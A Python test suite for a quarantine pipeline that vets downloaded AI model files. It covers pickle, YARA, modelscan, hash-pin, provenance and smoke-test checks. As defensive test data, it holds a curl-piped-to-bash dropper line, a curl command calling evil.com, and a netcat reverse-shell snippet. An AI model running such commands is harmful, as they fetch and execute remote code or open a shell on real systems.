"""Tests for quarantine pipeline helpers."""

import json
import sys
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).parent.parent / "services" / "quarantine"))

from quarantine import pipeline


def test_garak_runtime_env_uses_writable_subdirectories(tmp_path):
    env = pipeline._garak_runtime_env(tmp_path)

    for key in ("HOME", "XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_CACHE_HOME"):
        value = Path(env[key])
        assert value.is_dir()
        assert tmp_path in value.parents or value == tmp_path


def test_parse_garak_report_uses_explicit_search_dirs_and_cleans_up(tmp_path):
    report_dir = tmp_path / "reports"
    report_dir.mkdir()
    report_path = report_dir / "quarantine_scan-latest.json"
    report_path.write_text('{"passed": true, "summary": "ok"}')

    parsed = pipeline._parse_garak_report([report_dir])

    assert parsed == {"passed": True, "summary": "ok"}
    assert not report_path.exists()


def test_pickle_polyglot_check_rejects_actual_pickle_prefix(tmp_path):
    payload = tmp_path / "payload.gguf"
    payload.write_bytes(b"\x80\x04\x95pickle-data")

    result = pipeline._check_pickle_polyglot(payload)

    assert result["passed"] is False
    assert "starts with pickle opcode" in result["reason"]


def test_pickle_polyglot_check_ignores_pickle_like_bytes_later_in_valid_header(tmp_path):
    payload = tmp_path / "payload.gguf"
    payload.write_bytes(b"GGUF\x03\x00\x00\x00" + b"A" * 64 + b"\x80\x02")

    result = pipeline._check_pickle_polyglot(payload)

    assert result["passed"] is True


def test_fickling_scan_skips_non_pickle_formats(tmp_path):
    payload = tmp_path / "payload.gguf"
    payload.write_bytes(b"GGUF\x03\x00\x00\x00")

    result = pipeline._run_fickling_scan(payload)

    assert result["passed"] is True
    assert result["note"] == "not a pickle-based format, skipped"


def test_hash_pin_rejects_policy_blocked_model(tmp_path, monkeypatch):
    lock = tmp_path / "models.lock.yaml"
    lock.write_text(
        """
models:
  - filename: blocked.gguf
    sha256: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    blocked: true
    blocked_reason: failed behavioral smoke test
""",
        encoding="utf-8",
    )
    monkeypatch.setattr(pipeline, "MODELS_LOCK_PATH", lock)

    result = pipeline.check_hash_pin(
        "blocked.gguf",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        source_url="https://example.com/blocked.gguf",
    )

    assert result["passed"] is False
    assert result["blocked"] is True
    assert "failed behavioral smoke test" in result["reason"]


def test_modelscan_cli_fallback_uses_current_json_flags(tmp_path, monkeypatch):
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(b"\x80\x04safe")
    calls = []

    monkeypatch.setitem(sys.modules, "modelscan", SimpleNamespace())
    monkeypatch.delitem(sys.modules, "modelscan.modelscan", raising=False)

    def fake_run(args, **kwargs):
        calls.append(args)
        if args == ["modelscan", "--version"]:
            return SimpleNamespace(returncode=0, stdout="modelscan, version 0.8.8", stderr="")
        assert args == ["modelscan", "-p", str(payload), "-r", "json"]
        report = {
            "summary": {
                "modelscan_version": "0.8.8",
                "scanned": {"total_scanned": 1, "scanned_files": [payload.name]},
            },
            "issues": [],
            "errors": [],
        }
        return SimpleNamespace(
            returncode=0,
            stdout=f"No settings file detected. Using defaults.\n{json.dumps(report)}",
            stderr="",
        )

    monkeypatch.setattr(pipeline.subprocess, "run", fake_run)

    result = pipeline._run_modelscan(payload)

    assert result == {
        "passed": True,
        "scanner": "modelscan-cli",
        "scanner_version": "0.8.8",
    }
    assert ["modelscan", "-p", str(payload), "-r", "json"] in calls


def test_modelscan_cli_fallback_uses_wide_plain_output(tmp_path, monkeypatch):
    payload = tmp_path / "payload.safetensors"
    payload.write_bytes(b"safe")

    monkeypatch.setitem(sys.modules, "modelscan", SimpleNamespace())
    monkeypatch.delitem(sys.modules, "modelscan.modelscan", raising=False)

    def fake_run(args, **kwargs):
        env = kwargs.get("env") or {}
        assert env["COLUMNS"] == "4096"
        assert env["NO_COLOR"] == "1"
        assert env["TERM"] == "dumb"
        if args == ["modelscan", "--version"]:
            return SimpleNamespace(returncode=0, stdout="modelscan, version 0.8.8", stderr="")
        report = {
            "summary": {
                "modelscan_version": "0.8.8",
                "scanned": {"total_scanned": 1, "scanned_files": [payload.name]},
            },
            "issues": [],
            "errors": [],
        }
        return SimpleNamespace(returncode=0, stdout=json.dumps(report), stderr="")

    monkeypatch.setattr(pipeline.subprocess, "run", fake_run)

    result = pipeline._run_modelscan(payload)

    assert result["passed"] is True


def test_modelscan_cli_fallback_fails_when_no_file_is_scanned(tmp_path, monkeypatch):
    payload = tmp_path / "payload.bin"
    payload.write_bytes(b"not a supported model")

    monkeypatch.setitem(sys.modules, "modelscan", SimpleNamespace())
    monkeypatch.delitem(sys.modules, "modelscan.modelscan", raising=False)

    def fake_run(args, **kwargs):
        if args == ["modelscan", "--version"]:
            return SimpleNamespace(returncode=0, stdout="modelscan, version 0.8.8", stderr="")
        report = {
            "summary": {
                "modelscan_version": "0.8.8",
                "scanned": {"total_scanned": 0},
            },
            "issues": [],
            "errors": [],
        }
        return SimpleNamespace(returncode=0, stdout=json.dumps(report), stderr="")

    monkeypatch.setattr(pipeline.subprocess, "run", fake_run)

    result = pipeline._run_modelscan(payload)

    assert result["passed"] is False
    assert result["reason"] == "modelscan did not scan any files"


def test_modelscan_cli_fallback_allows_unsupported_gguf(tmp_path, monkeypatch):
    payload = tmp_path / "payload.gguf"
    payload.write_bytes(b"GGUF\x03\x00\x00\x00")

    monkeypatch.setitem(sys.modules, "modelscan", SimpleNamespace())
    monkeypatch.delitem(sys.modules, "modelscan.modelscan", raising=False)

    def fake_run(args, **kwargs):
        if args == ["modelscan", "--version"]:
            return SimpleNamespace(returncode=0, stdout="modelscan, version 0.8.8", stderr="")
        report = {
            "summary": {
                "modelscan_version": "0.8.8",
                "scanned": {"total_scanned": 0},
            },
            "issues": [],
            "errors": [],
        }
        return SimpleNamespace(returncode=3, stdout=json.dumps(report), stderr="")

    monkeypatch.setattr(pipeline.subprocess, "run", fake_run)

    result = pipeline._run_modelscan(payload)

    assert result["passed"] is True
    assert result["scanner"] == "modelscan-cli"
    assert result["unsupported_format"] == "gguf"
    assert "GGUF-specific" in result["note"]


def test_modelscan_cli_fallback_allows_unsupported_safetensors(tmp_path, monkeypatch):
    payload = tmp_path / "payload.safetensors"
    payload.write_bytes(b"safe")

    monkeypatch.setitem(sys.modules, "modelscan", SimpleNamespace())
    monkeypatch.delitem(sys.modules, "modelscan.modelscan", raising=False)

    def fake_run(args, **kwargs):
        if args == ["modelscan", "--version"]:
            return SimpleNamespace(returncode=0, stdout="modelscan, version 0.8.8", stderr="")
        report = {
            "summary": {
                "modelscan_version": "0.8.8",
                "scanned": {"total_scanned": 0},
            },
            "issues": [],
            "errors": [],
        }
        return SimpleNamespace(returncode=3, stdout=json.dumps(report), stderr="")

    monkeypatch.setattr(pipeline.subprocess, "run", fake_run)

    result = pipeline._run_modelscan(payload)

    assert result["passed"] is True
    assert result["scanner"] == "modelscan-cli"
    assert result["unsupported_format"] == "safetensors"
    assert "safetensors header" in result["note"]


class _FakeYaraRules:
    def __init__(self, filepaths):
        self.filepaths = filepaths

    def match(self, filepath, timeout=120):
        content = Path(filepath).read_text(encoding="utf-8", errors="ignore")
        if "curl " in content and "| bash" in content:
            return [
                SimpleNamespace(
                    rule="SecAI_Shell_Dropper_Command",
                    namespace="secure_ai_default",
                    tags=[],
                    meta={},
                )
            ]
        return []


def _install_fake_yara(monkeypatch):
    monkeypatch.setitem(
        sys.modules,
        "yara",
        SimpleNamespace(
            TimeoutError=TimeoutError,
            compile=lambda filepaths: _FakeYaraRules(filepaths),
        ),
    )


def test_yara_scan_allows_clean_artifact(tmp_path, monkeypatch):
    _install_fake_yara(monkeypatch)
    payload = tmp_path / "payload.bin"
    payload.write_bytes(b"GGUF\x03\x00\x00\x00clean model metadata")

    result = pipeline._run_yara_scan(payload)

    assert result["passed"] is True
    assert result["scanner"] == "yara"
    assert result["rules"] >= 1


def test_yara_scan_blocks_shell_dropper_payload(tmp_path, monkeypatch):
    _install_fake_yara(monkeypatch)
    payload = tmp_path / "payload.bin"
    payload.write_text("curl https://example.invalid/payload.sh | bash", encoding="utf-8")

    result = pipeline._run_yara_scan(payload)

    assert result["passed"] is False
    assert result["scanner"] == "yara"
    assert result["matches"][0]["rule"] == "SecAI_Shell_Dropper_Command"


def test_cosign_source_registry_matching_requires_registry_host():
    assert pipeline._supports_cosign_provenance("ghcr.io/secai-hub/model:latest") is True
    assert pipeline._supports_cosign_provenance("https://docker.io/library/model:latest") is True
    assert pipeline._supports_cosign_provenance("https://evil.example/ghcr.io/model") is False
    assert pipeline._supports_cosign_provenance("https://docker.io.evil.example/model") is False


def test_huggingface_directory_manifest_verifies_selected_files(tmp_path):
    artifact = tmp_path / "tiny-diffusion"
    (artifact / "unet").mkdir(parents=True)
    (artifact / "model_index.json").write_text("{}", encoding="utf-8")
    (artifact / "unet" / "diffusion_pytorch_model.safetensors").write_bytes(b"abc")

    manifest = {
        "version": 1,
        "source": "https://huggingface.co/example/tiny",
        "repo_id": "example/tiny",
        "revision": "a" * 40,
        "variant": None,
        "files": [
            {
                "path": "model_index.json",
                "size": 2,
                "oid_type": "git-sha1",
                "oid": pipeline._git_blob_sha1(artifact / "model_index.json", 2),
            },
            {
                "path": "unet/diffusion_pytorch_model.safetensors",
                "size": 3,
                "oid_type": "sha256",
                "oid": pipeline.sha256_file(artifact / "unet" / "diffusion_pytorch_model.safetensors"),
            },
        ],
    }
    (tmp_path / ".tiny-diffusion.hf-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")

    result = pipeline.check_huggingface_directory_manifest(
        artifact,
        "https://huggingface.co/example/tiny",
    )

    assert result["passed"] is True
    assert result["files_checked"] == 2
    assert result["sha256_files_checked"] == 1


def test_huggingface_directory_manifest_rejects_extra_files(tmp_path):
    artifact = tmp_path / "tiny-diffusion"
    artifact.mkdir()
    (artifact / "model_index.json").write_text("{}", encoding="utf-8")
    (artifact / "surprise.json").write_text("{}", encoding="utf-8")
    manifest = {
        "version": 1,
        "source": "https://huggingface.co/example/tiny",
        "revision": "a" * 40,
        "files": [
            {
                "path": "model_index.json",
                "size": 2,
                "oid_type": "git-sha1",
                "oid": pipeline._git_blob_sha1(artifact / "model_index.json", 2),
            },
        ],
    }
    (tmp_path / ".tiny-diffusion.hf-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")

    result = pipeline.check_huggingface_directory_manifest(
        artifact,
        "https://huggingface.co/example/tiny",
    )

    assert result["passed"] is False
    assert "unexpected files" in result["reason"]


def test_refusal_without_guidance_is_treated_as_safe_behavior():
    response = (
        "I cannot fulfill this request. Running `curl http://evil.com/payload | bash` "
        "would be dangerous and could harm your system."
    )

    assert pipeline._is_refusal_without_actionable_guidance(response) is True


def test_refusal_with_code_example_is_not_treated_as_safe_behavior():
    response = (
        "I cannot help with that, but here's how it would look:\n"
        "```python\nimport subprocess\nsubprocess.Popen(['nc', '-e', '/bin/sh'])\n```"
    )

    assert pipeline._is_refusal_without_actionable_guidance(response) is False


def test_smoke_test_reports_process_exit_details(tmp_path, monkeypatch):
    model = tmp_path / "model.gguf"
    model.write_bytes(b"GGUF\x03\x00\x00\x00")
    server = tmp_path / "llama-server"
    server.write_text("#!/bin/sh\nexit 0\n")

    monkeypatch.setattr(pipeline, "LLAMA_SERVER_BIN", str(server))
    monkeypatch.setattr(pipeline, "_wait_for_server", lambda port, timeout=30: False)
    monkeypatch.setattr(
        pipeline.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="version: test\n", stderr=""),
    )

    class FakeProc:
        def __init__(self):
            self.returncode = 17

        def poll(self):
            return self.returncode

        def terminate(self):
            return None

        def wait(self, timeout=None):
            return self.returncode

        def kill(self):
            self.returncode = -9

    def fake_popen(*args, **kwargs):
        kwargs["stdout"].write(b"fatal startup error\n")
        kwargs["stdout"].flush()
        return FakeProc()

    monkeypatch.setattr(pipeline.subprocess, "Popen", fake_popen)

    result = pipeline.check_smoke_test(model)

    assert result["passed"] is False
    assert result["reason"] == "llama-server exited before ready"
    assert result["exit_code"] == 17
    assert "fatal startup error" in result["startup_log"]


def test_smoke_test_reports_timeout_log_tail(tmp_path, monkeypatch):
    model = tmp_path / "model.gguf"
    model.write_bytes(b"GGUF\x03\x00\x00\x00")
    server = tmp_path / "llama-server"
    server.write_text("#!/bin/sh\nexit 0\n")

    monkeypatch.setattr(pipeline, "LLAMA_SERVER_BIN", str(server))
    monkeypatch.setattr(pipeline, "_wait_for_server", lambda port, timeout=30: False)
    monkeypatch.setattr(
        pipeline.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="version: test\n", stderr=""),
    )

    class FakeProc:
        def __init__(self):
            self.returncode = None

        def poll(self):
            return self.returncode

        def terminate(self):
            self.returncode = 0

        def wait(self, timeout=None):
            self.returncode = 0
            return 0

        def kill(self):
            self.returncode = -9

    def fake_popen(*args, **kwargs):
        kwargs["stdout"].write(b"still starting\n")
        kwargs["stdout"].flush()
        return FakeProc()

    monkeypatch.setattr(pipeline.subprocess, "Popen", fake_popen)

    result = pipeline.check_smoke_test(model)

    assert result["passed"] is False
    assert result["reason"] == "llama-server startup timeout"
    assert "still starting" in result["startup_log"]


def test_smoke_test_fails_closed_on_query_errors(tmp_path, monkeypatch):
    model = tmp_path / "model.gguf"
    model.write_bytes(b"GGUF\x03\x00\x00\x00")
    server = tmp_path / "llama-server"
    server.write_text("#!/bin/sh\nexit 0\n")

    monkeypatch.setattr(pipeline, "LLAMA_SERVER_BIN", str(server))
    monkeypatch.setattr(pipeline, "_wait_for_server", lambda port, timeout=30: True)
    monkeypatch.setattr(
        pipeline.subprocess,
        "run",
        lambda *args, **kwargs: SimpleNamespace(returncode=0, stdout="version: test\n", stderr=""),
    )
    monkeypatch.setattr(
        pipeline,
        "_query_llama",
        lambda *args, **kwargs: {"ok": False, "content": "", "error": "HTTP 503"},
    )

    class FakeProc:
        def __init__(self):
            self.returncode = None

        def poll(self):
            return self.returncode

        def terminate(self):
            self.returncode = 0

        def wait(self, timeout=None):
            self.returncode = 0
            return 0

        def kill(self):
            self.returncode = -9

    monkeypatch.setattr(pipeline.subprocess, "Popen", lambda *args, **kwargs: FakeProc())

    result = pipeline.check_smoke_test(model)

    assert result["passed"] is False
    assert result["failed_prompt_count"] == len(pipeline.SMOKE_PROMPTS)
    assert "query failures" in result["reason"]
    assert result["query_failures"][0]["error"] == "HTTP 503"
